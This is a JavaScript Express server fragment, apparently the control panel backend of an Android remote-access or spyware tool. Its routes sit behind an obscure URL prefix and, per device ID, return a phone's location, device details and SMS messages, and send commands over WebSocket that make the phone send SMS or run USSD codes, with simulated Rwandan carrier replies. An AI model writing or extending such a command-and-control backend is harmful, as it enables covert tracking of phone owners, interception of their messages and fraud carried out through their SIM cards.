// ============================================================
// DEVICE-SPECIFIC API ENDPOINTS
// ============================================================

// Get location for specific device
app.get('/a9f3k217/api/location/:deviceId', authenticate, (req, res) => {
    const { deviceId } = req.params;
    
    if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    // Return device-specific location (simulated or real)
    res.json({
        lat: devices[deviceId].lat || -1.9441,
        lng: devices[deviceId].lng || 30.0619,
        accuracy: devices[deviceId].accuracy || 15,
        time: new Date().toLocaleString()
    });
});

// Get device info for specific device
app.get('/a9f3k217/api/device-info/:deviceId', authenticate, (req, res) => {
    const { deviceId } = req.params;
    
    if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    const device = devices[deviceId];
    res.json({
        model: device.model || 'Samsung Galaxy S23',
        manufacturer: device.manufacturer || 'Samsung',
        android_version: device.android_version || '14.0',
        battery: device.battery || 76,
        storage: device.storage || '128GB / 89GB used',
        device_id: deviceId
    });
});

// Get SMS for specific device
app.get('/a9f3k217/api/sms/:deviceId', authenticate, (req, res) => {
    const { deviceId } = req.params;
    
    // Return device-specific SMS
    // In production, this would come from the actual device
    const deviceSms = smsMessages.filter(msg => msg.deviceId === deviceId);
    res.json(deviceSms);
});

// Send SMS from specific device
app.post('/a9f3k217/api/send-sms', authenticate, (req, res) => {
    const { deviceId, number, message } = req.body;
    
    if (!deviceId || !number || !message) {
        return res.status(400).json({ error: 'Device ID, number, and message required' });
    }
    
    if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    // Forward to device via WebSocket
    const deviceWs = getDeviceWebSocket(deviceId);
    if (deviceWs) {
        deviceWs.send(JSON.stringify({
            type: 'send_sms',
            number: number,
            message: message,
            timestamp: Date.now()
        }));
        
        // Store in SMS history
        smsMessages.push({
            deviceId: deviceId,
            number: number,
            body: message,
            timestamp: Date.now(),
            sent: true
        });
        if (smsMessages.length > 1000) smsMessages.shift();
        
        res.json({ success: true, message: `SMS sent to ${number} from device ${deviceId}` });
    } else {
        // Queue for later
        res.json({ 
            success: false, 
            error: 'Device offline. SMS queued for later.',
            queued: true
        });
    }
});

// Get USSD history for specific device
app.get('/a9f3k217/api/ussd-numbers/:deviceId', authenticate, (req, res) => {
    const { deviceId } = req.params;
    
    const deviceUssd = ussdNumbers.filter(n => n.deviceId === deviceId);
    res.json(deviceUssd);
});

// Execute USSD on specific device
app.post('/a9f3k217/api/ussd', authenticate, (req, res) => {
    const { deviceId, code } = req.body;
    
    if (!deviceId || !code) {
        return res.status(400).json({ error: 'Device ID and USSD code required' });
    }
    
    if (!devices[deviceId]) {
        return res.status(404).json({ error: 'Device not found' });
    }
    
    console.log(`📞 USSD sent to device ${deviceId}: ${code}`);
    
    // Forward to device via WebSocket
    const deviceWs = getDeviceWebSocket(deviceId);
    if (deviceWs) {
        deviceWs.send(JSON.stringify({
            type: 'ussd',
            code: code,
            timestamp: Date.now()
        }));
        
        // Simulate response
        setTimeout(() => {
            let responseMessage = '';
            if (code.includes('123')) {
                responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
            } else if (code.includes('131')) {
                responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
            } else if (code.includes('144')) {
                responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
            } else if (code.includes('200')) {
                responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
            } else {
                responseMessage = `USSD code ${code} executed on device ${deviceId}. No further response available.`;
            }
            
            // Save the USSD number
            const cleanNumber = code.replace(/\D/g, '');
            if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
                ussdNumbers.push({
                    deviceId: deviceId,
                    device: devices[deviceId].name || deviceId,
                    number: cleanNumber,
                    type: 'USSD',
                    timestamp: Date.now()
                });
                if (ussdNumbers.length > 100) ussdNumbers.shift();
            }
            
            // Send response back to client
            // (The response is already sent, but we could update via WebSocket)
        }, 2000);
        
        res.json({ 
            success: true, 
            message: `USSD code ${code} sent to device ${deviceId}. Waiting for response...`
        });
    } else {
        res.json({ 
            success: false, 
            error: `Device ${deviceId} is offline. USSD code queued.`
        });
    }
});
